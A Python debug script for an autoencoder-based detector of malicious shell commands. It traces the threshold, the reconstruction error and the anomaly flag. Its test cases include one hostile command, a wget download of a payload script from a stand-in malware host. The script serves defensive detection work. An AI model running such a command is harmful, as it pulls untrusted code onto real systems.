
#!/usr/bin/env python3
"""
Debug detection logic step by step
"""
import sys
import os
import torch
from pathlib import Path

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.getcwd(), 'src')))

from cyanide.ml.pipeline import CyanideML

def debug_detection(command: str):
    """
    Debug detection for a single command
    """
    print("="*60)
    print(f"DEBUG: {command}")
    print("="*60)
    
    # Load pipeline
    try:
        pipeline = CyanideML(Path("ai_models/cyanideML"))
    except Exception as e:
        print(f"[!] Failed to load pipeline: {e}")
        return
    
    # Get raw components
    autoencoder = pipeline.anomaly_detector
    threshold = autoencoder.threshold
    
    print("\n1. THRESHOLD")
    print(f"   Value: {threshold}")
    
    # Preprocess
    vector = autoencoder.preprocess(command)
    print("\n2. PREPROCESSING")
    print(f"   Tensor Shape: {vector.shape}")
    
    # Forward pass
    autoencoder.eval()
    with torch.no_grad():
        reconstructed = autoencoder(vector)
        # Compute error (MSE)
        error = torch.mean((vector - reconstructed) ** 2, dim=1).item()
    
    print("\n3. RECONSTRUCTION")
    print(f"   MSE Error: {error}")
    
    # Score computation
    # In model.py:
    # is_anomaly = error > self.threshold
    # score = min(error / self.threshold, 1.0) + (0.1 if is_anomaly else 0)
    
    score_calc = error / threshold if threshold > 0 else 0
    is_anomaly_logic = error > threshold
    
    print("\n4. SCORE CALCULATION (Manual)")
    print(f"   Error: {error}")
    print(f"   Threshold: {threshold}")
    print(f"   Ratio (Error/Threshold): {score_calc}")
    print(f"   Is Anomaly (Error > Threshold): {is_anomaly_logic}")
    
    # Actual pipeline result
    result = pipeline.analyze_command(command)
    
    print("\n5. ACTUAL PIPELINE RESULT")
    print(f"   Verdict: {'anomaly' if result['is_anomaly'] else 'clean'}")
    print(f"   Is Anomaly Flag: {result['is_anomaly']}")
    print(f"   Score: {result.get('anomaly_score', 'N/A')}")
    print(f"   Error: {result.get('reconstruction_error', 'N/A')}")
    
    # Verification
    print("\n6. VERIFICATION")
    if is_anomaly_logic != result['is_anomaly']:
         print("   ❌ MISMATCH! Logic doesn't match 'Error > Threshold'")
    else:
         print("   ✅ Logic matches 'Error > Threshold'")
         
    if is_anomaly_logic and not result['is_anomaly']:
         print("   ❌ CRITICAL: Error > Threshold but Flag is False!")
         
    print("="*60)

if __name__ == "__main__":
    # Test cases
    test_commands = [
        "ls",  # Clean
        "wget http://malware.com/payload.sh",  # Malicious
    ]
    
    for cmd in test_commands:
        debug_detection(cmd)
        print("\n")
